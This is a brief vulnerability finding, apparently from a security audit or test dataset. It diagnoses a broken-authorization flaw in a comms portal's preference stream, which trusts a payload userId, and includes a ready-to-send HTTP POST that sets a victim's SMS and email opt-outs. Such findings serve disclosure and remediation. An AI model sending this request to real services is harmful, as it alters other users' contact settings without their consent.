diagnosis: The stream consumer updates user communication opt-out flags based on userId parsed from unverified stream payloads. Any event produced with a mismatched userId overwrites contact preferences of other users.
exploit_request:
POST /api/preferences/publish-stream HTTP/1.1
Host: comms.portal.org
Authorization: Bearer <user_token>
Content-Type: application/json

{"userId": "usr_victim_4401", "smsOptOut": true, "emailOptOut": true}
